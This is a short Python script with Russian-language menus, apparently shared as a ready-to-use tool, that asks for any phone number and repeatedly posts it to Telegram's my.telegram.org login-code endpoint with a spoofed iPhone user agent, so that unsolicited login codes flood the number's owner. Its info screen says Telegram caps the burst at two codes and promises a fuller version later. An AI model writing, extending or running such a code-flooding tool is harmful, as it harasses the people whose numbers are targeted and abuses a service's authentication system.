# пользуйтесь с удовольствием =)

import shutil
import os
import time
import requests # >>> pip install requests

def draw_list(text):
    lines = text.strip().split('\n')
    max_len = max(len(line) for line in lines)
    width = max_len + 4
    height = len(lines) + 2
    term_width = shutil.get_terminal_size().columns
    left_padding = (term_width - width) // 2
    print(" " * left_padding + "╔" + "═" * (width - 2) + "╗")
    for line in lines:
        padding = (width - 2 - len(line)) // 2
        print(" " * left_padding + "║" + " " * padding + line + " " * (width - 2 - padding - len(line)) + "║")
    print(" " * left_padding + "╚" + "═" * (width - 2) + "╝")

def draw_input(prompt):
    width = len(prompt) + 4
    term_width = shutil.get_terminal_size().columns
    left_padding = (term_width - width) // 2
    return input(" " * left_padding + "> ")
    
### ### ### ### ### ###

def flood_codes():
    os.system("clear")
    draw_list("Доброго времени суток!")
    print("")
    draw_list("Введите номер телефона")
    phone_number = draw_input("")
    os.system("clear")
    draw_list("Доброго времени суток!")
    print("")
    url = "https://my.telegram.org/auth/send_password"
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1"
    }
    for _ in range(2):
        payload = {"phone": phone_number}
        try:
            response = requests.post(url, data=payload, headers=headers)
            if response.status_code == 200:
                draw_list(f"Код для входа запрошен на номер {phone_number}.")
            else:
                draw_list(f"Ошибка: {response.status_code} - {response.text}")
        except Exception as e:
            draw_list(f"Ошибка при отправке запроса: {e}")
        time.sleep(2)
    draw_list("Завершено\nНажмите ENTER")
    input()
    main()

### ### ### ### ### ###

def main():
	os.system("clear")
	draw_list("Доброго времени суток!")
	print("")
	draw_list("1. Флуд кодами [Telegram]\n2. Информация\n3. Выход")
	print("")
	choice = draw_input("")
	if choice == "1":
		flood_codes()
	elif choice == "2":
		os.system("clear")
		draw_list("Доброго времени суток!")
		print("")
		draw_list("Telegram не позволяет отправить более 2-ух кодов за раз.\nВерсия софта: 1.0\n Полная версия будет доступна позже\n\nНажмите ENTER чтобы перейти в главное меню.")
		input()
		main()
	elif choice == "3":
		os.system("clear")
		draw_list("Доброго времени суток!")
	else:
		main()
	
if __name__ == "__main__":
    main()
